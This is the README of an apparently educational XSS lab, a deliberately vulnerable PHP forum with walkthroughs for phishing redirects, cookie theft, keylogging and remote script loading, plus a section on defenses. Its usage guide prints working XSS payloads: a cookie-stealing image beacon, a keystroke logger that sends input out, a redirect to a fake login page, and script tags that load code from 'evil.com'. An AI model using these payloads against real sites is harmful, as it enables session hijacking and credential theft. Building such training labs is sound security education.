# XSS漏洞演示靶场

![License](https://img.shields.io/badge/license-MIT-blue.svg)
![PHP](https://img.shields.io/badge/PHP-7.0%2B-purple.svg)
![Educational](https://img.shields.io/badge/Purpose-Educational-orange.svg)

## ⚠️ 免责声明

**本项目仅用于安全教学和演示目的！**

- 请勿将本项目用于任何非法用途
- 未经授权攻击他人系统属于违法行为
- 使用本项目的任何后果由使用者自行承担
- 作者不对任何滥用行为负责

## 📖 项目简介

这是一个完整的XSS（跨站脚本攻击）漏洞演示靶场，用于安全教学和演示。项目模拟了真实的技术论坛场景，包含多种XSS攻击方式的演示，帮助学习者理解XSS漏洞的原理和危害。

### 📸 项目截图

<table>
<tr>
<td align="center"><b>演示入口页面</b></td>
<td align="center"><b>论坛主页面</b></td>
</tr>
<tr>
<td><img src="../img/demo1.png" alt="演示入口" width="400"/></td>
<td><img src="../img/forum.png" alt="论坛页面" width="400"/></td>
</tr>
<tr>
<td align="center"><b>钓鱼登录页面</b></td>
<td align="center"><b>凭据查看页面</b></td>
</tr>
<tr>
<td><img src="../img/login.png" alt="钓鱼页面" width="400"/></td>
<td><img src="../img/view_credentials.png" alt="凭据查看" width="400"/></td>
</tr>
<tr>
<td align="center" colspan="2"><b>Cookie查看页面</b></td>
</tr>
<tr>
<td colspan="2" align="center"><img src="../img/view_cookies.png" alt="Cookie查看" width="400"/></td>
</tr>
</table>

### 演示场景

1. **💣 XSS Payload库** - 收集了235+个常见XSS攻击向量，支持一键复制和测试
2. **🛡️ XSS防御演示** - 学习如何正确防御XSS攻击，对比多种防御方法
3. **🎣 钓鱼攻击** - 通过XSS注入恶意代码，将用户重定向到伪造的登录页面，窃取用户凭据
4. **🍪 Cookie窃取** - 窃取用户的Cookie信息，包括Session ID等敏感数据
5. **⌨️ 键盘记录** - 记录用户的键盘输入，窃取密码等敏感信息
6. **🌐 远程JS引入** - 加载外部恶意JavaScript文件，实现远程控制和持续攻击
7. **💬 存储型XSS** - 恶意代码存储在服务器，所有访问该页面的用户都会受到影响
8. **🔍 反射型XSS** - 通过URL参数传递恶意代码，诱骗用户点击恶意链接

## 🎯 功能特性

- ✅ XSS Payload库，包含235+个常见攻击向量
- ✅ XSS防御演示，对比多种防御方法
- ✅ XSS类型演示，入门学习反射型、存储型、DOM型XSS
- ✅ 拟真的技术论坛页面，降低用户警惕
- ✅ 完整的钓鱼攻击流程演示
- ✅ Cookie窃取功能演示
- ✅ 键盘记录功能演示
- ✅ 远程JS引入攻击演示
- ✅ 实时查看窃取的数据（整合数据查看器）
- ✅ 详细的Payload构成解释
- ✅ 一键触发演示功能
- ✅ 支持删除评论
- ✅ 响应式设计，支持移动端

## 📁 项目结构

```
xss/
├── 📄 README.md                 # 项目说明文档
├── 📄 LICENSE                   # 开源协议
├── 📄 AUTHORS                   # 作者信息
├── 📄 .gitignore               # Git忽略文件
├── 📄 demo.php                 # 演示入口页面
├── 📄 xss_types_demo.php        # XSS类型演示（入门学习）
├── 📄 forum.php                # 存在XSS漏洞的论坛页面
├── 📄 keylogger_demo.php       # 键盘记录演示
├── 📄 payload_library.php      # XSS Payload库
├── 📄 payload_library.js       # Payload库外部脚本
├── 📄 payloads.json            # Payload数据文件（235+条）
├── 📄 defense_demo.php         # XSS防御演示
├── 📄 test_payload.html        # Payload测试页面
├── 📄 simple_test.html         # 简化测试页面
├── 📄 viewer.php               # 整合数据查看器（凭据/Cookie/键盘记录）
├── 📁 phishing/                # 钓鱼攻击相关文件
│   └── 📄 login.html           # 伪造的登录页面
├── 📁 data/                    # 数据存储目录
│   ├── 📄 stolen_credentials.txt  # 窃取的凭据（自动生成）
│   ├── 📄 stolen_cookies.txt      # 窃取的Cookie（自动生成）
│   ├── 📄 keylog.txt              # 键盘记录（自动生成）
│   └── 📄 forum_comments.txt      # 论坛评论（自动生成）
├── 📄 steal.php                # 接收窃取的凭据
├── 📄 steal_cookie.php         # 接收窃取的Cookie
├── 📄 save_keylog.php          # 保存键盘记录
├── 📄 clear_credentials.php    # 清空凭据数据
├── 📄 clear_cookies.php        # 清空Cookie数据
├── 📄 clear_keylogs.php        # 清空键盘记录
├── 📄 clear_forum_comments.php # 清空论坛评论
├── 📄 clear_xss_comments.php   # 清空XSS演示评论
└── 📁 assets/                  # 静态资源目录
```

## 🚀 快速开始

### 环境要求

- PHP 7.0 或更高版本
- Apache/Nginx Web服务器
- 支持文件写入权限

### 安装步骤

1. **克隆项目**
```bash
git clone https://github.com/Guojin0826/xss-lab.git
cd xss-lab
```

2. **配置Web服务器**

**Apache配置示例：**
```apache
<VirtualHost *:80>
    DocumentRoot "/path/to/xss-demo"
    ServerName xss-demo.local
    <Directory "/path/to/xss-demo">
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
</VirtualHost>
```

**Nginx配置示例：**
```nginx
server {
    listen 80;
    server_name xss-demo.local;
    root /path/to/xss-demo;
    index index.php index.html;

    location ~ \.php$ {
        fastcgi_pass 127.0.0.1:9000;
        fastcgi_index index.php;
        include fastcgi_params;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    }
}
```

3. **设置目录权限**
```bash
chmod 755 -R xss-demo/
chmod 777 xss-demo/data/  # 确保数据目录可写
```

4. **访问演示**
```
http://xss-demo.local/demo.php
```

### 📸 演示截图

#### 演示入口页面
![演示入口页面](../img/demo1.png)
*演示入口页面，展示完整的攻击流程说明*

#### 论坛主页面
![论坛主页面](../img/forum.png)
*拟真的技术论坛页面，包含XSS漏洞*

#### 钓鱼登录页面
![钓鱼登录页面](../img/login.png)
*伪造的登录页面，用于窃取用户凭据*

#### 凭据查看页面
![凭据查看页面](../img/view_credentials.png)
*查看窃取的用户账号密码*

#### Cookie查看页面
![Cookie查看页面](../img/view_cookies.png)
*查看窃取的用户Cookie信息*

## 🎮 使用指南

### 钓鱼攻击演示

1. 访问 `demo.php` 演示入口
2. 点击"访问论坛"进入存在漏洞的论坛页面
3. 在演示控制面板选择"钓鱼攻击"
4. 选择Payload类型，点击"触发XSS攻击"
5. 页面自动跳转到伪造的登录页面
6. 输入任意用户名和密码
7. 自动跳回原页面，凭据被保存
8. 访问 `view_credentials.php` 查看窃取的凭据

### Cookie窃取演示

1. 访问 `demo.php` 演示入口
2. 点击"访问论坛"进入存在漏洞的论坛页面
3. 在演示控制面板选择"Cookie窃取"
4. 选择Payload类型，点击"触发XSS攻击"
5. Cookie自动发送到服务器
6. 访问 `viewer.php` 查看窃取的Cookie

### 键盘记录演示

1. 访问 `keylogger_demo.php` 键盘记录演示页面
2. 在输入框中输入任意内容
3. 键盘输入会被实时记录
4. 访问 `viewer.php` 查看键盘记录

### 远程JS引入演示

1. 访问 `forum.php` 论坛页面
2. 在演示控制面板选择"远程JS引入"
3. 选择Payload类型（直接引入、动态创建、JSONP、Data URI等）
4. 点击"触发XSS攻击"
5. 外部恶意JS文件被加载并执行
6. 攻击者可随时修改远程JS文件内容，无需重新注入

### XSS类型演示（入门学习）

1. 访问 `xss_types_demo.php` XSS类型演示页面
2. 分别体验反射型、存储型、DOM型XSS
3. 每种类型都有详细的说明和演示
4. 适合初学者理解XSS的基本概念

### 手动注入Payload

在论坛评论区输入以下Payload：

**钓鱼攻击：**
```html
<script>
if (!sessionStorage.getItem('phished')) {
    sessionStorage.setItem('phished', 'true');
    var currentUrl = window.location.href;
    var phishingUrl = 'phishing/login.html?redirect=' + encodeURIComponent(currentUrl);
    window.location.href = phishingUrl;
}
</script>
```

**Cookie窃取：**
```html
<script>
var img = new Image();
img.src = 'steal_cookie.php?cookie=' + encodeURIComponent(document.cookie);
</script>
```

**键盘记录：**
```html
<script>
var k='';
document.addEventListener('keydown',function(e){
    var key=e.key;
    if(key==='Enter')key='[ENTER]';
    if(key===' ')key='[SPACE]';
    k+=key;
    if(k.length>=20){
        new Image().src='save_keylog.php?k='+encodeURIComponent(k);
        k='';
    }
});
</script>
```

**远程JS引入：**
```html
<!-- 直接引入外部JS -->
<script src="http://evil.com/malicious.js"></script>

<!-- 动态创建script标签 -->
<script>
var s=document.createElement('script');
s.src='http://evil.com/malicious.js';
document.body.appendChild(s);
</script>

<!-- Data URI方式 -->
<script src="data:text/javascript;base64,YWxlcnQoJ1hTUycp"></script>
```

## 📚 XSS Payload 构成详解

### 钓鱼攻击Payload组成

| 组件 | 代码 | 作用 |
|------|------|------|
| 触发载体 | `<script>...</script>` | 包裹JavaScript代码 |
| 防重复机制 | `if (!sessionStorage.getItem('phished'))` | 避免循环跳转 |
| 标记设置 | `sessionStorage.setItem('phished', 'true')` | 标记已攻击 |
| 获取URL | `window.location.href` | 获取当前页面地址 |
| 构造URL | `encodeURIComponent(currentUrl)` | 编码URL参数 |
| 执行跳转 | `window.location.href = phishingUrl` | 重定向到钓鱼页面 |

### Cookie窃取Payload组成

| 组件 | 代码 | 作用 |
|------|------|------|
| 触发载体 | `<script>...</script>` | 包裹JavaScript代码 |
| 创建对象 | `new Image()` | 创建图片对象 |
| 获取Cookie | `document.cookie` | 读取所有Cookie |
| URL编码 | `encodeURIComponent()` | 编码特殊字符 |
| 构造URL | `steal_cookie.php?cookie=...` | 攻击者服务器地址 |
| 发送请求 | `img.src = url` | 触发HTTP请求 |

## 🛡️ XSS防御措施

### 输入过滤

```php
// PHP示例
function sanitize($input) {
    return htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
}

// 使用
$comment = sanitize($_POST['comment']);
```

### 输出编码

```php
// HTML上下文
echo htmlspecialchars($data, ENT_QUOTES, 'UTF-8');

// JavaScript上下文
echo json_encode($data, JSON_HEX_TAG);
```

### 设置CSP

```php
// 设置Content-Security-Policy
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
```

### HttpOnly Cookie

```php
// 设置HttpOnly标志
setcookie("session", $value, [
    'httponly' => true,
    'secure' => true,
    'samesite' => 'Strict'
]);
```

## 🔧 技术栈

- **后端**: PHP 7.0+
- **前端**: HTML5, CSS3, JavaScript
- **样式**: 纯CSS（无框架）
- **数据存储**: 文件系统（演示用）

## 📝 更新日志

### v1.5.0 (2024-05-29)
- ✨ 新增远程JS引入攻击演示
- ✨ 新增键盘记录攻击演示
- ✨ 新增XSS类型演示（入门学习）
- ✨ 整合数据查看器（凭据/Cookie/键盘记录三合一）
- ✨ 优化演示入口页面UI
- ✨ 添加一键清理所有数据功能

### v1.0.0 (2024-01-XX)
- ✨ 初始版本发布
- ✨ 实现钓鱼攻击演示
- ✨ 实现Cookie窃取演示
- ✨ 添加演示控制面板
- ✨ 添加Payload构成解释
- ✨ 添加返回按钮
- ✨ 支持删除评论

## 🤝 贡献指南

欢迎提交Issue和Pull Request！

1. Fork本项目
2. 创建特性分支 (`git checkout -b feature/AmazingFeature`)
3. 提交更改 (`git commit -m 'Add some AmazingFeature'`)
4. 推送到分支 (`git push origin feature/AmazingFeature`)
5. 提交Pull Request

## 📄 许可证

本项目采用 MIT 许可证 - 详见 [LICENSE](LICENSE) 文件

## 👨‍💻 作者

**guojin**

## 🙏 致谢

- 感谢所有为网络安全教育做出贡献的人
- 本项目仅用于教学目的，请勿用于非法用途

## 📞 联系方式

如有问题或建议，请通过以下方式联系：
- 提交 [GitHub Issue](https://github.com/Guojin0826/xss-lab/issues)
- 发送邮件至 jinrcsy@gmail.com

---

**⭐ 如果这个项目对你有帮助，请给一个Star支持！**
